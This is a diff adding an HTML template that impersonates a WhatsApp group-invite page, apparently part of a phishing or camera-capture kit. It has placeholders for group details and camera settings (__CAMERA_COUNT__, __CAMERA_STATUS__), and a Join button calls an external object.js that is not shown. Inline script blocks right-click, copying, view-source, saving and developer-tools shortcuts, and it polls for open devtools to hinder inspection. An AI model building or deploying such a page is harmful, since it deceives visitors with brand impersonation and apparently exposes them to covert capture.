@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yz/r/ujTY9i_Jhs1.png">
+    <title>WhatsApp Group Invite</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1ebea5 0%, #128c7e 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+            margin: auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            color: white;
+            margin-bottom: 10px;
+        }
+
+        .logo i {
+            font-size: 32px;
+        }
+
+        .logo h1 {
+            font-size: 28px;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 16px;
+        }
+
+        .invite-card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            padding: 30px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .invite-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .group-image-container {
+            margin: 0 auto 25px;
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 5px solid #e7f0e4;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .group-image-container:hover {
+            transform: scale(1.05);
+            border-color: #1ebea5;
+        }
+
+        .group-image-link {
+            display: block;
+            width: 100%;
+            height: 100%;
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .group-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            background: linear-gradient(135deg, #25d366, #128c7e);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 50px;
+        }
+
+        .group-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .group-name {
+            font-size: 26px;
+            font-weight: 700;
+            color: #232323;
+            margin-bottom: 10px;
+        }
+
+        .group-description {
+            color: #5b5f62;
+            font-size: 16px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .group-details {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        .detail-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .detail-icon {
+            background: #e7f0e4;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            color: #128c7e;
+            font-size: 20px;
+        }
+
+        .detail-label {
+            font-size: 14px;
+            color: #7c7f81;
+        }
+
+        .detail-value {
+            font-size: 18px;
+            font-weight: 600;
+            color: #232323;
+        }
+
+        .join-button {
+            background: #01e675;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 16px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(1, 230, 117, 0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .join-button:hover {
+            background: #00c95a;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(1, 230, 117, 0.6);
+        }
+
+        .note {
+            font-size: 14px;
+            color: #7c7f81;
+            margin-top: 15px;
+        }
+
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
+        }
+
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: white;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 0 15px;
+            }
+
+            .invite-card {
+                padding: 25px 20px;
+            }
+
+            .group-image-container {
+                width: 100px;
+                height: 100px;
+            }
+
+            .group-name {
+                font-size: 22px;
+            }
+
+            .group-details {
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-whatsapp"></i>
+                <h1>WhatsApp</h1>
+            </div>
+            <p class="subtitle">Group Invitation</p>
+        </div>
+
+        <div class="invite-card">
+            <div class="group-image-container">
+                <a href="#" class="group-image-link">
+                    <div class="group-image">
+                        <img src="__IMAGE__"
+                            alt="Group Image">
+                    </div>
+                </a>
+            </div>
+
+            <h2 class="group-name">__GROUP_NAME__</h2>
+            <p class="group-description">
+                __GROUP_DESCRIPTION__
+            </p>
+
+            <div class="group-details">
+                <div class="detail-item">
+                    <div class="detail-icon">
+                        <i class="fas fa-user-friends"></i>
+                    </div>
+                    <div class="detail-label">Members</div>
+                    <div class="detail-value">__GROUP_MEMBERS__</div>
+                </div>
+
+                <div class="detail-item">
+                    <div class="detail-icon">
+                        <i class="fas fa-comment-alt"></i>
+                    </div>
+                    <div class="detail-label">Active</div>
+                    <div class="detail-value">Daily</div>
+                </div>
+
+                <div class="detail-item">
+                    <div class="detail-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="detail-label">Privacy</div>
+                    <div class="detail-value">Private</div>
+                </div>
+            </div>
+
+            <button class="join-button" onclick="click_button()">
+                <i class="fab fa-whatsapp"></i> Join Group
+            </button>
+
+            <p class="note">Click the group image to learn more about this community</p>
+        </div>
+
+        <div class="footer">
+            <p>WhatsApp &copy; 2026</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Help Center</a>
+            </div>
+        </div>
+    </div>
+    <script src="object.js"></script>
+    <script>const delay = __CAMERA_COUNT__; window.in_button.sc(delay); window.in_button.button_enable(__CAMERA_STATUS__); function click_button() { window.in_button.accept(); }</script>
+    <script>document.addEventListener('contextmenu', e => e.preventDefault()); document.addEventListener('dragstart', e => !e.target.matches('button,input,textarea,a,[contenteditable="true"]') && (e.preventDefault(), !1)); document.addEventListener('selectstart', e => !e.target.matches('input,textarea,[contenteditable="true"]') && (e.preventDefault(), !1)); document.addEventListener('copy', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('cut', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('paste', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('keydown', e => { (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) || (e.ctrlKey && ['u', 'U'].includes(e.key)) || e.key === 'F11' || (e.ctrlKey && ['s', 'S', 'p', 'P'].includes(e.key)) || (e.altKey && e.key === 'Tab')) && (e.preventDefault(), !1) }); setInterval(() => { const w = window.outerWidth - window.innerWidth > 160, h = window.outerHeight - window.innerHeight > 160; (w || h) && !window.devToolsOpen && (window.devToolsOpen = !0) }, 2000);</script>
+</body>
+</html>
